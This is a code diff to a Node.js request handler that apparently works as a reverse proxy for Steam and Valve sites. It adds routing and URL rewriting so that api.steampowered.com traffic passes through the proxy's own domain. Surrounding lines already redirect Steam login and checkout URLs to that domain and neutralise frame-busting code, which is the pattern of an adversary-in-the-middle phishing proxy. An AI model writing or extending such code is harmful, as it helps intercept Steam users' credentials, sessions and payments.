@@ -17,9 +17,15 @@ module.exports = async function handler(req, res) {
     targetDomain = 'https://www.valvesoftware.com';
   } else if (urlPath.startsWith('/partner/')) {
     targetDomain = 'https://partner.steamgames.com';
+  } else if (urlPath.startsWith('/api_proxy/')) {
+    targetDomain = 'https://api.steampowered.com';
   }
 
-  let steamUrl = targetDomain + urlPath.replace('/partner', '').replace('/valve', '');
+  let steamUrl = targetDomain + urlPath
+      .replace('/partner', '')
+      .replace('/valve', '')
+      .replace('/api_proxy', '');
+
   if (targetDomain === 'https://store.steampowered.com' || targetDomain === 'https://steamcommunity.com' || targetDomain === 'https://help.steampowered.com') {
       steamUrl = targetDomain + urlPath;
   }
@@ -108,6 +114,10 @@ module.exports = async function handler(req, res) {
       
       html = html.replace(/https?:\\\/\\\/checkout\.steampowered\.com/gi, myDomain.replace(/\//g, '\\/'));
       html = html.replace(/https?:\\\/\\\/login\.steampowered\.com/gi, myDomain.replace(/\//g, '\\/'));
+      
+      // Rewrite WEBAPI Base URL in JSON configs
+      html = html.replace(/https?:\/\/api\.steampowered\.com/gi, myDomain + '/api_proxy');
+      html = html.replace(/https?:\\\/\\\/api\.steampowered\.com/gi, myDomain.replace(/\//g, '\\/') + '\\/api_proxy');
       
       html = html.replace(/window\.top\.location/gi, "window.self.location");
       
